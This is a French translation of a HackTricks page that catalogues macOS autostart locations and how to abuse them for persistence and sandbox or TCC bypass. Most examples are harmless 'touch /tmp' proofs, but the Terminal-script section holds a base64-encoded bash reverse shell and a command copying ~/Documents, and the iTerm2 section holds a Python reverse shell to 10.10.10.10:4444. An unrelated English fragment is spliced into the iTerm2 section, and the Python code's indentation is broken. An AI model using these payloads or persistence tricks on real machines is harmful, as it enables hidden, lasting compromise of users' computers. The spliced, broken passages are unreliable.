# Démarrage automatique de macOS

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

Cette section est fortement basée sur la série de blogs [**Au-delà des bons vieux LaunchAgents**](https://theevilbit.github.io/beyond/), le but est d'ajouter **plus d'emplacements de démarrage automatique** (si possible), d'indiquer **quelles techniques fonctionnent toujours** de nos jours avec la dernière version de macOS (13.4) et de spécifier les **autorisations** nécessaires.

## Contournement de la sandbox

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement de la sandbox** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action très courante**, un **montant déterminé de temps** ou une **action que vous pouvez généralement effectuer** depuis l'intérieur d'une sandbox sans avoir besoin de permissions root.
{% endhint %}

### Launchd

* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

* **`/Library/LaunchAgents`**
* **Déclencheur** : Redémarrage
* Nécessite les droits root
* **`/Library/LaunchDaemons`**
* **Déclencheur** : Redémarrage
* Nécessite les droits root
* **`/System/Library/LaunchAgents`**
* **Déclencheur** : Redémarrage
* Nécessite les droits root
* **`/System/Library/LaunchDaemons`**
* **Déclencheur** : Redémarrage
* Nécessite les droits root
* **`~/Library/LaunchAgents`**
* **Déclencheur** : Reconnexion
* **`~/Library/LaunchDemons`**
* **Déclencheur** : Reconnexion

{% hint style="success" %}
En tant que fait intéressant, **`launchd`** a une liste de propriétés intégrée dans la section Mach-o `__Text.__config` qui contient d'autres services bien connus que `launchd` doit démarrer. De plus, ces services peuvent contenir les propriétés `RequireSuccess`, `RequireRun` et `RebootOnSuccess` qui signifient qu'ils doivent être exécutés et terminés avec succès.

Bien sûr, cela ne peut pas être modifié en raison de la signature du code.
{% endhint %}

#### Description et exploitation

**`launchd`** est le **premier** **processus** exécuté par le noyau OX S au démarrage et le dernier à se terminer à l'arrêt. Il devrait toujours avoir le **PID 1**. Ce processus lira et exécutera les configurations indiquées dans les **plists** **ASEP** dans :

* `/Library/LaunchAgents` : Agents par utilisateur installés par l'administrateur
* `/Library/LaunchDaemons` : Daemons système installés par l'administrateur
* `/System/Library/LaunchAgents` : Agents par utilisateur fournis par Apple.
* `/System/Library/LaunchDaemons` : Daemons système fournis par Apple.

Lorsqu'un utilisateur se connecte, les plists situés dans `/Users/$USER/Library/LaunchAgents` et `/Users/$USER/Library/LaunchDemons` sont démarrés avec les **permissions des utilisateurs connectés**.

**La principale différence entre les agents et les daemons est que les agents sont chargés lorsque l'utilisateur se connecte et les daemons sont chargés au démarrage du système** (car il y a des services comme ssh qui doivent être exécutés avant que tout utilisateur n'accède au système). De plus, les agents peuvent utiliser l'interface graphique tandis que les daemons doivent s'exécuter en arrière-plan.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Il existe des cas où un **agent doit être exécuté avant la connexion de l'utilisateur**, ceux-ci sont appelés **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d'assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).

{% hint style="info" %}
Les nouveaux fichiers de configuration des Daemons ou Agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>` Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas automatiquement chargés après le redémarrage).\
Il est également possible de **décharger** avec `launchctl unload <target.plist>` (le processus pointé par celui-ci sera terminé),

Pour **s'assurer** qu'il n'y a **rien** (comme un remplacement) **empêchant un** **Agent** ou **Daemon** **de** **s'exécuter**, exécutez : `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Listez tous les agents et daemons chargés par l'utilisateur actuel :
```bash
launchctl list
```
{% hint style="warning" %}
Si un plist est détenu par un utilisateur, même s'il se trouve dans des dossiers système de démon, la **tâche sera exécutée en tant qu'utilisateur** et non en tant que root. Cela peut prévenir certaines attaques d'escalade de privilèges.
{% endhint %}

#### Plus d'informations sur launchd

**`launchd`** est le **premier** processus en mode utilisateur qui est lancé à partir du **noyau**. Le démarrage du processus doit être **réussi** et il ne peut pas **se terminer ou planter**. Il est même **protégé** contre certains **signaux de terminaison**.

Une des premières choses que `launchd` ferait est de **démarrer** tous les **démons** comme :

* **Démons de minuterie** basés sur le temps à exécuter :
  * atd (`com.apple.atrun.plist`) : a un `StartInterval` de 30 minutes
  * crond (`com.apple.systemstats.daily.plist`) : a `StartCalendarInterval` pour démarrer à 00:15
* **Démons réseau** comme :
  * `org.cups.cups-lpd` : Écoute en TCP (`SockType: stream`) avec `SockServiceName: printer`
  * `SockServiceName` doit être soit un port, soit un service de `/etc/services`
  * `com.apple.xscertd.plist` : Écoute en TCP sur le port 1640
* **Démons de chemin** qui sont exécutés lorsque le chemin spécifié change :
  * `com.apple.postfix.master` : Vérification du chemin `/etc/postfix/aliases`
* **Démons de notifications IOKit** :
  * `com.apple.xartstorageremoted` : `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Port Mach** :
  * `com.apple.xscertd-helper.plist` : Il indique dans l'entrée `MachServices` le nom `com.apple.xscertd.helper`
* **UserEventAgent** :
  * Ceci est différent du précédent. Il fait en sorte que launchd lance des applications en réponse à des événements spécifiques. Cependant, dans ce cas, le binaire principal impliqué n'est pas `launchd` mais `/usr/libexec/UserEventAgent`. Il charge des plugins à partir du dossier restreint SIP /System/Library/UserEventPlugins/ où chaque plugin indique son initialiseur dans la clé `XPCEventModuleInitializer` ou, dans le cas d'anciens plugins, dans le dictionnaire `CFPluginFactories` sous la clé `FB86416D-6164-2070-726F-70735C216EC0` de son `Info.plist`.

### Fichiers de démarrage de shell

Analyse : [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Analyse (xterm) : [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez trouver une application avec un contournement de TCC qui exécute un shell qui charge ces fichiers

#### Emplacements

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
  * **Déclencheur** : Ouvrir un terminal avec zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **Déclencheur** : Ouvrir un terminal avec zsh
  * Nécessite des droits root
* **`~/.zlogout`**
  * **Déclencheur** : Fermer un terminal avec zsh
* **`/etc/zlogout`**
  * **Déclencheur** : Fermer un terminal avec zsh
  * Nécessite des droits root
* Potentiellement plus dans : **`man zsh`**
* **`~/.bashrc`**
  * **Déclencheur** : Ouvrir un terminal avec bash
* `/etc/profile` (n'a pas fonctionné)
* `~/.profile` (n'a pas fonctionné)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **Déclencheur** : Censé être déclenché avec xterm, mais il **n'est pas installé** et même après installation, cette erreur est générée : xterm : `DISPLAY is not set`

#### Description & Exploitation

Lors de l'initialisation d'un environnement de shell tel que `zsh` ou `bash`, **certains fichiers de démarrage sont exécutés**. macOS utilise actuellement `/bin/zsh` comme shell par défaut. Ce shell est automatiquement accédé lorsque l'application Terminal est lancée ou lorsqu'un appareil est accédé via SSH. Bien que `bash` et `sh` soient également présents dans macOS, ils doivent être explicitement invoqués pour être utilisés.

La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, contient une longue description des fichiers de démarrage.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications Réouvertes

{% hint style="danger" %}
Configurer l'exploitation indiquée et se déconnecter et se reconnecter ou même redémarrer n'a pas fonctionné pour moi pour exécuter l'application. (L'application n'était pas exécutée, peut-être qu'elle doit être en cours d'exécution lorsque ces actions sont effectuées)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Déclencheur** : Redémarrer l'ouverture des applications

#### Description & Exploitation

Toutes les applications à rouvrir se trouvent dans le fichier plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Ainsi, pour que les applications à rouvrir lancent la vôtre, vous devez simplement **ajouter votre application à la liste**.

L'UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier les applications qui seront rouvertes, vous pouvez faire :
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Pour **ajouter une application à cette liste**, vous pouvez utiliser :
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Préférences du Terminal

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
* Le Terminal doit avoir les autorisations FDA de l'utilisateur qui l'utilise

#### Emplacement

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Déclencheur** : Ouvrir le Terminal

#### Description & Exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l'utilisateur dans les Applications. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.

Par exemple, le Terminal peut exécuter une commande au démarrage :

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** de cette manière :
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Donc, si le plist des préférences du terminal dans le système pouvait être écrasé, alors la fonctionnalité **`open`** peut être utilisée pour **ouvrir le terminal et exécuter cette commande**.

Vous pouvez ajouter ceci depuis la ligne de commande avec:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Scripts Terminal / Autres extensions de fichiers

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC: [✅](https://emojipedia.org/check-mark-button)
* Utilisation du terminal pour avoir les autorisations FDA de l'utilisateur qui l'utilise

#### Emplacement

* **N'importe où**
* **Déclencheur**: Ouvrir le Terminal

#### Description & Exploitation

Si vous créez un script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) et l'ouvrez, l'**application Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal a des privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.

Essayez avec:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Vous pouvez également utiliser les extensions **`.command`**, **`.tool`**, avec du contenu de scripts shell réguliers et ils seront également ouverts par Terminal.

{% hint style="danger" %}
Si le terminal a **l'Accès complet au disque**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).
{% endhint %}

### Plugins Audio

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [🟠](https://emojipedia.org/large-orange-circle)
* Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

* **`/Library/Audio/Plug-Ins/HAL`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`/Library/Audio/Plug-ins/Components`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`~/Library/Audio/Plug-ins/Components`**
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
* **`/System/Library/Components`**
* Nécessite les droits d'administrateur
* **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur

#### Description

Selon les writeups précédents, il est possible de **compiler certains plugins audio** et de les charger.

### Plugins QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [🟠](https://emojipedia.org/large-orange-circle)
* Vous pourriez obtenir un accès TCC supplémentaire

#### Emplacement

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NomApplicationIci/Contents/Library/QuickLook/`
* `~/Applications/NomApplicationIci/Contents/Library/QuickLook/`

#### Description & Exploitation

Les plugins QuickLook peuvent être exécutés lorsque vous **déclenchez l'aperçu d'un fichier** (appuyez sur la barre d'espace avec le fichier sélectionné dans Finder) et qu'un **plugin prenant en charge ce type de fichier** est installé.

Il est possible de compiler votre propre plugin QuickLook, de le placer dans l'un des emplacements précédents pour le charger, puis d'aller sur un fichier pris en charge et d'appuyer sur espace pour le déclencher.

### ~~Hooks de Connexion/Déconnexion~~

{% hint style="danger" %}
Cela n'a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root
{% endhint %}

**Writeup** : [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* Vous devez être capable d'exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Situé dans `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont obsolètes mais peuvent être utilisés pour exécuter des commandes lorsqu'un utilisateur se connecte.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Cette configuration est stockée dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Pour le supprimer :
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Le fichier de l'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Contournement conditionnel du bac à sable

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement du bac à sable** qui vous permet d'exécuter simplement quelque chose en **l'écrivant dans un fichier** et **en ne s'attendant pas à des conditions super communes** comme des **programmes spécifiques installés, des actions ou environnements d'utilisateur "non communs".
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Cependant, vous devez être capable d'exécuter le binaire `crontab`
* Ou être root
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Accès en écriture directe nécessite les droits root. Pas besoin de droits root si vous pouvez exécuter `crontab <fichier>`
* **Déclencheur**: Dépend de la tâche cron

#### Description et exploitation

Listez les tâches cron de l'**utilisateur actuel** avec:
```bash
crontab -l
```
Vous pouvez également voir tous les travaux cron des utilisateurs dans **`/usr/lib/cron/tabs/`** et **`/var/at/tabs/`** (nécessite des privilèges root).

Dans MacOS, plusieurs dossiers exécutant des scripts à **certaine fréquence** peuvent être trouvés dans :
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Là, vous pouvez trouver les **tâches cron** régulières, les **tâches at** (peu utilisées) et les **tâches périodiques** (principalement utilisées pour nettoyer les fichiers temporaires). Les tâches périodiques quotidiennes peuvent être exécutées par exemple avec : `periodic daily`.

Pour ajouter un **cronjob utilisateur de manière programatique**, il est possible d'utiliser :
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Contournement de TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 utilisé pour accorder des autorisations TCC

#### Emplacements

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Déclencheur**: Ouvrir iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Déclencheur**: Ouvrir iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Déclencheur**: Ouvrir iTerm

#### Description & Exploitation

Les scripts stockés dans **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** seront exécutés. Par exemple:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run processes when a user logs in. They are located in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run processes at system boot or login. They are located in `/Library/LaunchDaemons/` and `/System/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Le script **`~/Bibliothèque/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sera également exécuté:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Le fichier de préférences iTerm2 situé dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** peut **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.

Ce paramètre peut être configuré dans les paramètres d'iTerm2 :

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande est reflétée dans les préférences :
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Vous pouvez définir la commande à exécuter avec :

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Il est très probable qu'il existe **d'autres moyens d'abuser des préférences d'iTerm2** pour exécuter des commandes arbitraires.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Mais xbar doit être installé
* Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
* Il demande des autorisations d'accessibilité

#### Emplacement

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Déclencheur** : Une fois que xbar est exécuté

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar est démarré:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Mais Hammerspoon doit être installé
* Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
* Il demande des autorisations d'accessibilité

#### Emplacement

* **`~/.hammerspoon/init.lua`**
* **Déclencheur** : Une fois que Hammerspoon est exécuté

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sert de plateforme d'automatisation pour **macOS**, exploitant le langage de script **LUA** pour ses opérations. Notamment, il prend en charge l'intégration de code AppleScript complet et l'exécution de scripts shell, améliorant ainsi considérablement ses capacités de script.

L'application recherche un seul fichier, `~/.hammerspoon/init.lua`, et lorsque le script est lancé, il sera exécuté.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Mais BetterTouchTool doit être installé
* Contournement de TCC: [✅](https://emojipedia.org/check-mark-button)
* Il demande les autorisations Automation-Shortcuts et Accessibilité

#### Emplacement

* `~/Library/Application Support/BetterTouchTool/*`

Cet outil permet d'indiquer des applications ou des scripts à exécuter lorsque certaines combinaisons de touches sont pressées. Un attaquant pourrait configurer sa propre **combinaison de touches et action à exécuter dans la base de données** pour exécuter du code arbitraire (une combinaison de touches pourrait consister simplement à appuyer sur une touche).

### Alfred

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Mais Alfred doit être installé
* Contournement de TCC: [✅](https://emojipedia.org/check-mark-button)
* Il demande les autorisations Automation, Accessibilité et même Accès complet au disque

#### Emplacement

* `???`

Il permet de créer des workflows qui peuvent exécuter du code lorsque certaines conditions sont remplies. Potentiellement, il est possible pour un attaquant de créer un fichier de workflow et de le faire charger par Alfred (il est nécessaire de payer la version premium pour utiliser des workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Mais ssh doit être activé et utilisé
* Contournement de TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH a besoin d'un accès complet au disque

#### Emplacement

* **`~/.ssh/rc`**
* **Déclencheur**: Connexion via ssh
* **`/etc/ssh/sshrc`**
* Nécessite les droits root
* **Déclencheur**: Connexion via ssh

{% hint style="danger" %}
Pour activer ssh, un accès complet au disque est requis:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Description & Exploitation

Par défaut, sauf si `PermitUserRC no` dans `/etc/ssh/sshd_config`, lorsque **un utilisateur se connecte via SSH**, les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** seront exécutés.

### **Éléments de connexion**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez exécuter `osascript` avec des arguments
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Déclencheur :** Connexion
* Charge utile d'exploitation stockée en appelant **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Déclencheur :** Connexion
* Nécessite les droits root

#### Description

Dans Préférences Système -> Utilisateurs et groupes -> **Éléments de connexion**, vous pouvez trouver **les éléments à exécuter lorsque l'utilisateur se connecte**.\
Il est possible de les lister, d'en ajouter et d'en supprimer depuis la ligne de commande :
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ces éléments sont stockés dans le fichier **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Les **éléments de connexion** peuvent également être indiqués en utilisant l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) qui stockera la configuration dans **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP en tant qu'élément de connexion

(Vérifiez la section précédente sur les éléments de connexion, ceci est une extension)

Si vous stockez un fichier **ZIP** en tant qu'**élément de connexion**, l'**`Archive Utility`** l'ouvrira et si le zip était par exemple stocké dans **`~/Library`** et contenait le dossier **`LaunchAgents/file.plist`** avec une porte dérobée, ce dossier sera créé (ce n'est pas le cas par défaut) et le plist sera ajouté afin que la prochaine fois que l'utilisateur se connecte, la **porte dérobée indiquée dans le plist sera exécutée**.

Une autre option serait de créer les fichiers **`.bash_profile`** et **`.zshenv`** à l'intérieur du répertoire de l'utilisateur afin que si le dossier LaunchAgents existe déjà, cette technique fonctionnerait toujours.

### At

